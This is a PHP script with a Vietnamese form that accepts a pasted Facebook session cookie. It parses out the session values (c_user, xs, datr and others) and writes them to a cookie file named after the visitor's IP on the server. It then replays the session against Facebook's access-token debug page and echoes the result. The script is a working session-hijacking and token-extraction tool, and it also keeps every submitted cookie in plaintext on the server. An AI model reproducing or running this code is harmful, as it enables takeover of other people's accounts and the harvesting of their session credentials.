<?php

if(isset($_POST['cookie']))
{
function login($url,$data)
{
    $login = curl_init();
    curl_setopt($login, CURLOPT_COOKIEJAR,  $_SERVER['REMOTE_ADDR'].'_login.txt');
    curl_setopt($login, CURLOPT_COOKIEFILE, $_SERVER['REMOTE_ADDR'].'_login.txt');
    curl_setopt($login, CURLOPT_TIMEOUT, 1);
    curl_setopt($login, CURLOPT_RETURNTRANSFER, TRUE);
    curl_setopt($login, CURLOPT_URL, $url);
    curl_setopt($login, CURLOPT_REFERER, $url);
    curl_setopt($login, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($login, CURLOPT_FOLLOWLOCATION, TRUE);
	if($data)
	{
	curl_setopt($login, CURLOPT_POST, TRUE);
	curl_setopt($login, CURLOPT_POSTFIELDS, $data);
	}
    ob_start();
    return curl_exec ($login);
    ob_end_clean();
    curl_close ($login);
    unset($login);    
}
$cookie = $_POST['cookie'];

//echo $cookie;



if(preg_match('/datr=(.*?);/s',$cookie,$fr)) $datr = $fr[1];
if(preg_match('/fr=(.*?);/s',$cookie,$fr1)) $fr = $fr1[1];
if(preg_match('/sb=(.*?);/s',$cookie,$fr2)) $sb = $fr2[1];
if(preg_match('/c_user=(.*?);/s',$cookie,$fr3)) $c_user = $fr3[1];
if(preg_match('/xs=(.*?);/s',$cookie,$fr4)) $xs = $fr4[1];
if(preg_match('/csm=(.*?);/s',$cookie,$fr5)) $csm = $fr5[1];
if(preg_match('/s=(.*?);/s',$cookie,$fr6)) $s = $fr6[1];
//if(preg_match('/fr=(.*?);/s',$cookie,$fr7)) $fr = $fr7[1];
if(preg_match('/lu=(.*?);/s',$cookie,$fr8)) $lu = $fr8[1];
//if(preg_match('/fr=(.*?);/s',$cookie,$fr9)) $fr = $fr9[1];

//echo $datr.$fr.$sb.$c_user.$xs.$csm.$s.$lu;

$content = '
#HttpOnly_.facebook.com	TRUE	/	FALSE	1543990175	datr	'.$datr.'
#HttpOnly_.facebook.com	TRUE	/	FALSE	1488694175	fr	'.$fr.'
#HttpOnly_.facebook.com	TRUE	/	TRUE	1543990175	sb	'.$sb.'
.facebook.com	TRUE	/	TRUE	1488694175	c_user	'.$c_user.'
#HttpOnly_.facebook.com	TRUE	/	TRUE	1488694175	xs	'.$xs.'
.facebook.com	TRUE	/	FALSE	1488694175	csm	'.$csm.'
#HttpOnly_.facebook.com	TRUE	/	TRUE	1488694175	s	'.$s.'
#HttpOnly_.facebook.com	TRUE	/	TRUE	1543990175	lu	'.$lu.'
';

$fp2 = fopen($_SERVER['REMOTE_ADDR'].'_login.txt','w+');
fwrite($fp2,$content."\n");
fclose($fp2);

echo login('https://developers.facebook.com/tools/debug/accesstoken/?app_id=41158896424');

}
else
{
echo '
<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="content-type" content="text/html; UTF-8" />
<form action="?" method="POST" id="form">
<input type="text" class="form-control" name="cookie" value=""  placeholder="Nhập Cookie"/>
<button type="submit" name="submit" class="btn btn-danger">Xác Nhận</button>
</form>';
}